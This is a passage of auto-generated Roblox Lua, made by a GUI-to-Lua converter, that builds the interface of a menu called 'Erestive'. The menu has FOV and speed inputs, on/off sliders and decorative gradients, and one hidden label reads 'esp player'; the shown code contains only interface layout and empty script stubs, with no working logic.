G2L["421"]["Name"] = [[FOV]];
G2L["421"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.UICorner
G2L["422"] = Instance.new("UICorner", G2L["421"]);
G2L["422"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig
G2L["423"] = Instance.new("Frame", G2L["421"]);
G2L["423"]["BorderSizePixel"] = 0;
G2L["423"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["423"]["Size"] = UDim2.new(0.57695, 0, 0.81331, 0);
G2L["423"]["Position"] = UDim2.new(0.39591, 0, 0.09064, 0);
G2L["423"]["Name"] = [[FOVConfig]];
G2L["423"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.UICorner
G2L["424"] = Instance.new("UICorner", G2L["423"]);
G2L["424"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.FOVSet
G2L["425"] = Instance.new("TextBox", G2L["423"]);
G2L["425"]["Visible"] = false;
G2L["425"]["Name"] = [[FOVSet]];
G2L["425"]["PlaceholderColor3"] = Color3.fromRGB(90, 169, 157);
G2L["425"]["TextWrapped"] = true;
G2L["425"]["TextSize"] = 14;
G2L["425"]["TextColor3"] = Color3.fromRGB(71, 255, 38);
G2L["425"]["TextScaled"] = true;
G2L["425"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["425"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["425"]["ClearTextOnFocus"] = false;
G2L["425"]["PlaceholderText"] = [[Dis]];
G2L["425"]["Size"] = UDim2.new(0, 33, 0, 33);
G2L["425"]["Position"] = UDim2.new(0.54158, 0, 0, 0);
G2L["425"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["425"]["Text"] = [[100]];
G2L["425"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.FOVSet.LocalScript
G2L["426"] = Instance.new("LocalScript", G2L["425"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.SetFOV
G2L["427"] = Instance.new("Frame", G2L["423"]);
G2L["427"]["ZIndex"] = 2;
G2L["427"]["BorderSizePixel"] = 0;
G2L["427"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["427"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["427"]["Position"] = UDim2.new(-0.76654, 0, 1.31329, 0);
G2L["427"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["427"]["Name"] = [[SetFOV]];
G2L["427"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.SetFOV.Animations
G2L["428"] = Instance.new("LocalScript", G2L["427"]);
G2L["428"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.SetFOV.Animations.Sample
G2L["429"] = Instance.new("ImageLabel", G2L["428"]);
G2L["429"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["429"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["429"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["429"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["429"]["BackgroundTransparency"] = 1;
G2L["429"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.SetFOV.UICorner
G2L["42a"] = Instance.new("UICorner", G2L["427"]);
G2L["42a"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.SetFOV.Button
G2L["42b"] = Instance.new("TextButton", G2L["427"]);
G2L["42b"]["TextWrapped"] = true;
G2L["42b"]["TextSize"] = 14;
G2L["42b"]["TextScaled"] = true;
G2L["42b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["42b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["42b"]["BackgroundTransparency"] = 1;
G2L["42b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["42b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["42b"]["Text"] = [[ ]];
G2L["42b"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.SetFOV.Text
G2L["42c"] = Instance.new("TextLabel", G2L["427"]);
G2L["42c"]["TextWrapped"] = true;
G2L["42c"]["ZIndex"] = 9;
G2L["42c"]["TextSize"] = 14;
G2L["42c"]["TextScaled"] = true;
G2L["42c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["42c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42c"]["BackgroundTransparency"] = 1;
G2L["42c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["42c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["42c"]["Text"] = [[White]];
G2L["42c"]["Name"] = [[Text]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.SetFOV.UIGradient
G2L["42d"] = Instance.new("UIGradient", G2L["427"]);
G2L["42d"]["Rotation"] = -90;
G2L["42d"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.SetFOV.UIStroke
G2L["42e"] = Instance.new("UIStroke", G2L["427"]);
G2L["42e"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.UIListLayout
G2L["42f"] = Instance.new("UIListLayout", G2L["423"]);
G2L["42f"]["Padding"] = UDim.new(0, 10);
G2L["42f"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.FOVConfig.FOVSet2
G2L["430"] = Instance.new("TextBox", G2L["423"]);
G2L["430"]["Visible"] = false;
G2L["430"]["Name"] = [[FOVSet2]];
G2L["430"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["430"]["TextWrapped"] = true;
G2L["430"]["TextSize"] = 14;
G2L["430"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["430"]["TextScaled"] = true;
G2L["430"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["430"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["430"]["ClearTextOnFocus"] = false;
G2L["430"]["PlaceholderText"] = [[Speed]];
G2L["430"]["Size"] = UDim2.new(0, 33, 0, 33);
G2L["430"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["430"]["Text"] = [[0.1]];
G2L["430"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.UIGradient
G2L["431"] = Instance.new("UIGradient", G2L["421"]);
G2L["431"]["Rotation"] = -90;
G2L["431"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.ImageLabel
G2L["432"] = Instance.new("ImageLabel", G2L["421"]);
G2L["432"]["BorderSizePixel"] = 0;
G2L["432"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["432"]["Image"] = [[rbxassetid://120129574453255]];
G2L["432"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["432"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["432"]["BackgroundTransparency"] = 1;
G2L["432"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.WhiteBar
G2L["433"] = Instance.new("Frame", G2L["421"]);
G2L["433"]["Visible"] = false;
G2L["433"]["BorderSizePixel"] = 0;
G2L["433"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["433"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["433"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["433"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["433"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.WhiteBar.UIGradient
G2L["434"] = Instance.new("UIGradient", G2L["433"]);
G2L["434"]["Rotation"] = 90;
G2L["434"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV.UIStroke
G2L["435"] = Instance.new("UIStroke", G2L["421"]);
G2L["435"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.So1232
G2L["436"] = Instance.new("Frame", G2L["3e9"]);
G2L["436"]["Visible"] = false;
G2L["436"]["BorderSizePixel"] = 0;
G2L["436"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["436"]["Size"] = UDim2.new(0, 145, 0, 64);
G2L["436"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["436"]["Name"] = [[So1232]];
G2L["436"]["LayoutOrder"] = 5;
G2L["436"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.So123
G2L["437"] = Instance.new("Frame", G2L["3e9"]);
G2L["437"]["Visible"] = false;
G2L["437"]["BorderSizePixel"] = 0;
G2L["437"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["437"]["Size"] = UDim2.new(0, 145, 0, 64);
G2L["437"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["437"]["Name"] = [[So123]];
G2L["437"]["LayoutOrder"] = 2;
G2L["437"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.So123.Frame
G2L["438"] = Instance.new("Frame", G2L["437"]);
G2L["438"]["BorderSizePixel"] = 0;
G2L["438"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["438"]["Size"] = UDim2.new(0.7931, 0, 2.58219, 0);
G2L["438"]["Position"] = UDim2.new(0.11724, 0, -0, 0);
G2L["438"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["438"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.So123.Frame.ImageLabel
G2L["439"] = Instance.new("ImageLabel", G2L["438"]);
G2L["439"]["ZIndex"] = 2;
G2L["439"]["BorderSizePixel"] = 0;
G2L["439"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["439"]["Image"] = [[rbxassetid://134669175143859]];
G2L["439"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["439"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["439"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.So123.Frame.Highlight
G2L["43a"] = Instance.new("ImageLabel", G2L["438"]);
G2L["43a"]["BorderSizePixel"] = 0;
G2L["43a"]["ScaleType"] = Enum.ScaleType.Crop;
G2L["43a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["43a"]["Image"] = [[rbxassetid://134669175143859]];
G2L["43a"]["Size"] = UDim2.new(1, 0, 1.04545, 0);
G2L["43a"]["Visible"] = false;
G2L["43a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["43a"]["BackgroundTransparency"] = 1;
G2L["43a"]["Name"] = [[Highlight]];
G2L["43a"]["Position"] = UDim2.new(-0, 0, -0.02597, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2
G2L["43b"] = Instance.new("Frame", G2L["3e9"]);
G2L["43b"]["BorderSizePixel"] = 0;
G2L["43b"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["43b"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["43b"]["Position"] = UDim2.new(-0, 0, 0.23306, 0);
G2L["43b"]["Name"] = [[ONOFF2]];
G2L["43b"]["LayoutOrder"] = 3;
G2L["43b"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.LocalScript
G2L["43c"] = Instance.new("LocalScript", G2L["43b"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.WhiteBar
G2L["43d"] = Instance.new("Frame", G2L["43b"]);
G2L["43d"]["BorderSizePixel"] = 0;
G2L["43d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43d"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["43d"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["43d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["43d"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.WhiteBar.UIGradient
G2L["43e"] = Instance.new("UIGradient", G2L["43d"]);
G2L["43e"]["Rotation"] = 90;
G2L["43e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.Slider
G2L["43f"] = Instance.new("Frame", G2L["43b"]);
G2L["43f"]["BorderSizePixel"] = 0;
G2L["43f"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["43f"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["43f"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["43f"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.Slider.Animations
G2L["440"] = Instance.new("LocalScript", G2L["43f"]);
G2L["440"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.Slider.Animations.Sample
G2L["441"] = Instance.new("ImageLabel", G2L["440"]);
G2L["441"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["441"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["441"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["441"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["441"]["BackgroundTransparency"] = 1;
G2L["441"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.Slider.UICorner
G2L["442"] = Instance.new("UICorner", G2L["43f"]);
G2L["442"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.Slider.UIGradient
G2L["443"] = Instance.new("UIGradient", G2L["43f"]);
G2L["443"]["Rotation"] = -90;
G2L["443"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.Slider.Button
G2L["444"] = Instance.new("TextButton", G2L["43f"]);
G2L["444"]["TextSize"] = 14;
G2L["444"]["TextColor3"] = Color3.fromRGB(55, 0, 0);
G2L["444"]["BackgroundColor3"] = Color3.fromRGB(55, 0, 0);
G2L["444"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["444"]["ZIndex"] = 2;
G2L["444"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["444"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["444"]["Text"] = [[ ]];
G2L["444"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.Slider.Button.LocalScript
G2L["445"] = Instance.new("LocalScript", G2L["444"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.Slider.Button.UICorner
G2L["446"] = Instance.new("UICorner", G2L["444"]);
G2L["446"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.OnOrOff
G2L["447"] = Instance.new("TextLabel", G2L["43b"]);
G2L["447"]["TextWrapped"] = true;
G2L["447"]["ZIndex"] = 2;
G2L["447"]["TextSize"] = 14;
G2L["447"]["TextScaled"] = true;
G2L["447"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["447"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["447"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["447"]["BackgroundTransparency"] = 1;
G2L["447"]["Size"] = UDim2.new(0.20788, 0, 0.5158, 0);
G2L["447"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["447"]["Text"] = [[Off]];
G2L["447"]["Name"] = [[OnOrOff]];
G2L["447"]["Position"] = UDim2.new(0.40774, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.UICorner
G2L["448"] = Instance.new("UICorner", G2L["43b"]);
G2L["448"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.UIGradient
G2L["449"] = Instance.new("UIGradient", G2L["43b"]);
G2L["449"]["Rotation"] = -90;
G2L["449"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.ImageLabel
G2L["44a"] = Instance.new("ImageLabel", G2L["43b"]);
G2L["44a"]["BorderSizePixel"] = 0;
G2L["44a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["44a"]["Image"] = [[rbxassetid://15011030819]];
G2L["44a"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["44a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44a"]["BackgroundTransparency"] = 1;
G2L["44a"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.UIStroke
G2L["44b"] = Instance.new("UIStroke", G2L["43b"]);
G2L["44b"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.TextLabel
G2L["44c"] = Instance.new("TextLabel", G2L["43b"]);
G2L["44c"]["TextWrapped"] = true;
G2L["44c"]["BorderSizePixel"] = 0;
G2L["44c"]["TextSize"] = 14;
G2L["44c"]["TextScaled"] = true;
G2L["44c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["44c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44c"]["Size"] = UDim2.new(0, 142, 0, 50);
G2L["44c"]["Visible"] = false;
G2L["44c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44c"]["Text"] = [[esp player]];
G2L["44c"]["Position"] = UDim2.new(-0.01379, 0, 1.15, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF2.TextLabel.UICorner
G2L["44d"] = Instance.new("UICorner", G2L["44c"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF
G2L["44e"] = Instance.new("Frame", G2L["3e9"]);
G2L["44e"]["Visible"] = false;
G2L["44e"]["BorderSizePixel"] = 0;
G2L["44e"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["44e"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["44e"]["Position"] = UDim2.new(-0, 0, 0.23306, 0);
G2L["44e"]["Name"] = [[ONOFF]];
G2L["44e"]["LayoutOrder"] = 1;
G2L["44e"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.WhiteBar
G2L["44f"] = Instance.new("Frame", G2L["44e"]);
G2L["44f"]["BorderSizePixel"] = 0;
G2L["44f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44f"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["44f"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["44f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["44f"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.WhiteBar.UIGradient
G2L["450"] = Instance.new("UIGradient", G2L["44f"]);
G2L["450"]["Rotation"] = 90;
G2L["450"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.Slider
G2L["451"] = Instance.new("Frame", G2L["44e"]);
G2L["451"]["BorderSizePixel"] = 0;
G2L["451"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["451"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["451"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["451"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.Slider.Animations
G2L["452"] = Instance.new("LocalScript", G2L["451"]);
G2L["452"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.Slider.Animations.Sample
G2L["453"] = Instance.new("ImageLabel", G2L["452"]);
G2L["453"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["453"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["453"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["453"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["453"]["BackgroundTransparency"] = 1;
G2L["453"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.Slider.UICorner
G2L["454"] = Instance.new("UICorner", G2L["451"]);
G2L["454"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.Slider.UIGradient
G2L["455"] = Instance.new("UIGradient", G2L["451"]);
G2L["455"]["Rotation"] = -90;
G2L["455"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.Slider.Button
G2L["456"] = Instance.new("TextButton", G2L["451"]);
G2L["456"]["TextSize"] = 14;
G2L["456"]["TextColor3"] = Color3.fromRGB(55, 0, 0);
G2L["456"]["BackgroundColor3"] = Color3.fromRGB(55, 0, 0);
G2L["456"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["456"]["ZIndex"] = 2;
G2L["456"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["456"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["456"]["Text"] = [[ ]];
G2L["456"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.Slider.Button.LocalScript
G2L["457"] = Instance.new("LocalScript", G2L["456"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.Slider.Button.UICorner
G2L["458"] = Instance.new("UICorner", G2L["456"]);
G2L["458"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.OnOrOff
G2L["459"] = Instance.new("TextLabel", G2L["44e"]);
G2L["459"]["TextWrapped"] = true;
G2L["459"]["ZIndex"] = 2;
G2L["459"]["TextSize"] = 14;
G2L["459"]["TextScaled"] = true;
G2L["459"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["459"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["459"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["459"]["BackgroundTransparency"] = 1;
G2L["459"]["Size"] = UDim2.new(0.20788, 0, 0.5158, 0);
G2L["459"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["459"]["Text"] = [[Off]];
G2L["459"]["Name"] = [[OnOrOff]];
G2L["459"]["Position"] = UDim2.new(0.40774, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.UICorner
G2L["45a"] = Instance.new("UICorner", G2L["44e"]);
G2L["45a"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.UIGradient
G2L["45b"] = Instance.new("UIGradient", G2L["44e"]);
G2L["45b"]["Rotation"] = -90;
G2L["45b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.ImageLabel
G2L["45c"] = Instance.new("ImageLabel", G2L["44e"]);
G2L["45c"]["BorderSizePixel"] = 0;
G2L["45c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["45c"]["Image"] = [[rbxassetid://15011030819]];
G2L["45c"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["45c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45c"]["BackgroundTransparency"] = 1;
G2L["45c"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.ONOFF.UIStroke
G2L["45d"] = Instance.new("UIStroke", G2L["44e"]);
G2L["45d"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.UIGridLayout
G2L["45e"] = Instance.new("UIGridLayout", G2L["3e9"]);
G2L["45e"]["CellSize"] = UDim2.new(0, 145, 0, 40);
G2L["45e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["45e"]["CellPadding"] = UDim2.new(0, 9, 0, 20);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7
G2L["45f"] = Instance.new("ScrollingFrame", G2L["a6"]);
G2L["45f"]["Visible"] = false;
G2L["45f"]["Active"] = true;
G2L["45f"]["ZIndex"] = 3;
G2L["45f"]["BorderSizePixel"] = 0;
G2L["45f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["45f"]["Name"] = [[Frame7]];
G2L["45f"]["ScrollBarImageTransparency"] = 1;
G2L["45f"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
G2L["45f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["45f"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45f"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["45f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45f"]["ScrollBarThickness"] = 0;
G2L["45f"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.UIPadding
G2L["460"] = Instance.new("UIPadding", G2L["45f"]);
G2L["460"]["PaddingTop"] = UDim.new(0, 5);
G2L["460"]["PaddingRight"] = UDim.new(0, 5);
